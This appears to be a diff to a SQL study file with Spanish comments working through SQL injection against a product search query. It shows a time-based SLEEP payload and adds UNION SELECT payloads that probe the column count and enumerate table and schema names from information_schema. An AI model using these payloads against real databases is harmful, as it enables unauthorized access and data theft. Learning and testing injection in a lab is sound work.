@@ -7,6 +7,10 @@
 -- y en Oracle es DBMS_LOCK.Sleep( 60 );
 SELECT * FROM articulos WHERE nombre LIKE '%rojo' AND 1 = SLEEP(2); -- %' ;
 
+-- verifico cuantas columnas se estan seleccionando realmente agregando o sacando numeros hasta que no salte error
+SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT 1, 2, 3, 4 FROM information_schema.tables); -- %' ;
+
+
 -- aca trato de apendiar los nombre de las bases de datos y sus tablas 
 -- pero veo que hay 1 primera columna presente en el SELECT de productos pero que no se muestra (la ID probablemente)
 SELECT ?,? FROM ? WHERE ? LIKE '%rojo' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3, 4 FROM information_schema.tables); -- %' ;
